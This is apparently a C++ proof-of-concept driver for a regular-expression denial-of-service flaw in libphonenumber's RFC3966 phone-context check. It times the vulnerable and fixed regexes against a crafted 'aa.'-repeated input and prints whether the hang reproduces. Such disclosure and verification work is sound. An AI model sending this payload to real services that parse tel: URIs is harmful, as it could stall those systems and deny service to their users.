// DialRabbit — catastrophic backtracking (ReDoS, CWE-1333/CWE-400) in
// libphonenumber's C++ RFC3966 phone-context domainname check.
//
// This driver compiles and runs the REAL project code from libphonenumber
// v9.0.43 (commit 86ea33cee5c22ab7e23b3de368e7cc7fa439a2b7):
//   src/phonenumbers/regexp_adapter_icu.cc  (ICU regexp engine adapter)
// with the two regexes that PhoneNumberUtil builds verbatim at
// cpp/src/phonenumbers/phonenumberutil.cc:793-795 and feeds to
// RegExp::FullMatch() from PhoneNumberUtil::IsPhoneContextValid()
// (phonenumberutil.cc:2214-2217), which is called by
// BuildNationalNumberForParsing() (line 2229) on the attacker-controlled
// phone-context of any `tel:` URI handed to PhoneNumberUtil::Parse().
//
// The whole libphonenumber library cannot be linked in this sandbox (it needs
// libprotobuf-dev + protoc + abseil headers, none of which are installed and
// none of which can be fetched/compiled here as a non-root user in budget).
// The vulnerable artifact itself is a literal regex string, so the exact
// string is reconstructed from the real source text and matched through the
// project's own ICU adapter, the same engine libphonenumber uses by default
// (USE_ICU_REGEXP=ON in cpp/CMakeLists.txt).
//
// Build/run: bash run.sh

#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <sys/wait.h>
#include <unistd.h>

#include <unicode/uversion.h>

#include "phonenumbers/regexp_adapter_icu.h"

namespace {

// ==== constants copied verbatim from phonenumberutil.cc (v9.0.43) ====
const char kDigits[] = "0-9";
const char kValidAlphaInclUppercase[] = "A-Za-z";
const char kRfc3966VisualSeparator[] = "[\\-\\.\\(\\)]?";

// phonenumberutil.cc:790-791
std::string Rfc3966PhoneDigit() {
  return std::string("(") + kDigits + "|" + kRfc3966VisualSeparator + ")";
}
std::string Alphanum() {
  return std::string(kValidAlphaInclUppercase) + kDigits;  // line 792
}

// VULNERABLE initialisers, phonenumberutil.cc:793-795 at v9.0.43:
//   rfc3966_domainlabel_(StrCat("[", alphanum_, "]+((\\-)*[", alphanum_, "])*")),
//   rfc3966_toplabel_(StrCat("[", kValidAlphaInclUppercase, "]+((\\-)*[", alphanum_, "])*")),
std::string VulnerableDomainname() {
  const std::string alphanum = Alphanum();
  const std::string domainlabel =
      "[" + alphanum + "]+((\\-)*[" + alphanum + "])*";
  const std::string toplabel =
      "[" + std::string(kValidAlphaInclUppercase) + "]+((\\-)*[" + alphanum + "])*";
  return "^(" + domainlabel + "\\.)*" + toplabel + "\\.?$";  // line 848-849
}

// FIXED initialisers, upstream commit 981600c (PR #4070, 2026-11-06):
//   rfc3966_domainlabel_(StrCat("[", alphanum_, "]+(\\-+[", alphanum_, "]+)*")),
//   rfc3966_toplabel_(StrCat("[", kValidAlphaInclUppercase, "][", alphanum_,
//                            "]*(\\-+[", alphanum_, "]+)*")),
std::string FixedDomainname() {
  const std::string alphanum = Alphanum();
  const std::string domainlabel =
      "[" + alphanum + "]+(\\-+[" + alphanum + "]+)*";
  const std::string toplabel =
      "[" + std::string(kValidAlphaInclUppercase) + "][" + alphanum +
      "]*(\\-+[" + alphanum + "]+)*";
  return "^(" + domainlabel + "\\.)*" + toplabel + "\\.?$";
}

// phonenumberutil.cc:845-847 (global-number-digits, tried first by the || )
std::string Rfc3966GlobalNumberDigits() {
  return "^\\+" + Rfc3966PhoneDigit() + "*" + kDigits +
         Rfc3966PhoneDigit() + "*$";
}

// The phone-context value from the upstream regression test (PR #4070):
//   "tel:253-0000;phone-context=" + ("aa." * 30) + "aa!"
std::string AdversarialDomain(int labels) {
  std::string s;
  for (int i = 0; i < labels; i++) s += "aa.";
  s += "aa!";  // forces the whole match to fail after all labels matched
  return s;
}

struct Measurement {
  bool timed_out = false;
  bool matched = false;
  double ms = 0.0;
};

volatile pid_t g_child = 0;
void KillChild(int) {
  if (g_child > 0) kill(g_child, SIGKILL);
}

// Run one FullMatch in a child process so a pathological case cannot hang the
// PoC; the parent kills it after timeout_ms and reads the timing over a pipe.
Measurement RunMatch(const std::string& pattern, const std::string& input,
                     int timeout_ms) {
  Measurement m;
  int fds[2];
  if (pipe(fds) != 0) { m.timed_out = true; return m; }
  pid_t p = fork();
  if (p == 0) {
    close(fds[0]);
    i18n::phonenumbers::ICURegExpFactory factory;
    i18n::phonenumbers::RegExp* re = factory.CreateRegExp(pattern);
    auto t0 = std::chrono::steady_clock::now();
    bool matched = re->FullMatch(input);
    auto t1 = std::chrono::steady_clock::now();
    m.ms = std::chrono::duration<double, std::milli>(t1 - t0).count();
    m.matched = matched;
    delete re;
    ssize_t ignored = write(fds[1], &m, sizeof(m));
    (void)ignored;
    _exit(0);
  }
  close(fds[1]);
  if (p < 0) { close(fds[0]); m.timed_out = true; return m; }
  g_child = p;
  signal(SIGALRM, KillChild);
  alarm((unsigned)((timeout_ms + 999) / 1000));
  int st = 0;
  waitpid(p, &st, 0);
  alarm(0);
  g_child = 0;
  if (WIFSIGNALED(st) && WTERMSIG(st) == SIGKILL) {
    m.timed_out = true;
  } else {
    ssize_t n = read(fds[0], &m, sizeof(m));
    if (n != (ssize_t)sizeof(m)) m.timed_out = true;
  }
  close(fds[0]);
  return m;
}

}  // namespace

int main() {
  std::printf("=== DialRabbit: libphonenumber C++ RFC3966 phone-context ReDoS ===\n");
  std::printf("engine      : REAL src/phonenumbers/regexp_adapter_icu.cc (ICU %s)\n",
              U_ICU_VERSION);
  std::printf("vulnerable  : %s\n", VulnerableDomainname().c_str());
  std::printf("fixed (981600c): %s\n", FixedDomainname().c_str());
  std::printf("input       : phone-context = (\"aa.\" * N) + \"aa!\"  [upstream test input]\n\n");

  // Mirror IsPhoneContextValid(): global-number-digits OR domainname.
  const std::string digits = Rfc3966GlobalNumberDigits();
  const std::string vuln = VulnerableDomainname();
  const std::string fixed = FixedDomainname();

  std::printf("[-] vulnerable pattern, exponential growth:\n");
  int levels[] = {6, 8, 10, 12};
  for (int n : levels) {
    std::printf("    [parent] n=%-2d ", n); fflush(stdout);
    Measurement m = RunMatch(vuln, AdversarialDomain(n), 10000);
    if (m.timed_out) std::printf("TIMEOUT\n");
    else {
      std::printf("match=%d  %.1f ms\n", (int)m.matched, m.ms);
    }
  }
  // n=14 takes ~4 s on this host; demonstrate the cliff with a bounded run.
  {
    std::printf("    [parent] n=%-2d ", 14); fflush(stdout);
    Measurement m = RunMatch(vuln, AdversarialDomain(14), 10000);
    if (m.timed_out) std::printf("TIMEOUT (>10 s)\n");
    else std::printf("match=%d  %.1f ms\n", (int)m.matched, m.ms);
  }

  // The production payload: 30 repeated labels -> 2^30 backtracking paths.
  std::printf("\n[-] vulnerable pattern, upstream payload (N=30, 15 s budget):\n");
  std::printf("    [parent] n=30 "); fflush(stdout);
  Measurement evil = RunMatch(vuln, AdversarialDomain(30), 15000);
  if (evil.timed_out) {
    std::printf("no result after 15000 ms -> worker thread still inside FullMatch, killed\n");
  } else {
    std::printf("UNEXPECTED: match=%d %.1f ms (host too fast; raise N)\n",
                (int)evil.matched, evil.ms);
  }

  // Sanity: the same phone-context must still be rejected by the FIXED regex,
  // and in constant time.
  std::printf("\n[+] fixed pattern (upstream 981600c), N=30:\n");
  std::printf("    [parent] n=30 "); fflush(stdout);
  Measurement ok = RunMatch(fixed, AdversarialDomain(30), 15000);
  if (ok.timed_out) {
    std::printf("TIMEOUT (unexpected)\n");
  } else {
    std::printf("match=%d (rejected) in %.3f ms\n", (int)ok.matched, ok.ms);
  }

  // The global-number-digits alternative is tried first in the real code and
  // is linear; show it rejects instantly, proving the block comes from the
  // domainname pattern.
  std::printf("    [parent] global-number-digits alternative: ");
  fflush(stdout);
  Measurement g = RunMatch(digits, AdversarialDomain(30), 15000);
  std::printf("match=%d in %.3f ms\n", (int)g.matched, g.ms);

  if (evil.timed_out && !ok.timed_out && !ok.matched && !g.timed_out) {
    std::printf("\nPHONENUMBER-REDOS-CONFIRMED\n");
    return 0;
  }
  std::printf("\nPHONENUMBER-REDOS-NOT-REPRODUCED\n");
  return 1;
}
